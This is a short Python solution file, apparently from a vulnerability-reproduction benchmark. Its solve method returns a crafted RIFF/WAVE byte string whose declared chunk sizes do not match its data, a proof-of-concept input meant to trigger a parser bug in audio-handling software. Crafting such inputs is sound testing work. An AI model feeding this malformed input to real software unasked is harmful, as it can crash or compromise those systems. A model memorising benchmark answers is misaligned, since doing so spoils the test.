class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'RIFF\x32\x00\x00\x00WAVEfmt \x28\x00\x00\x00' + b'\x00' * 38
        return poc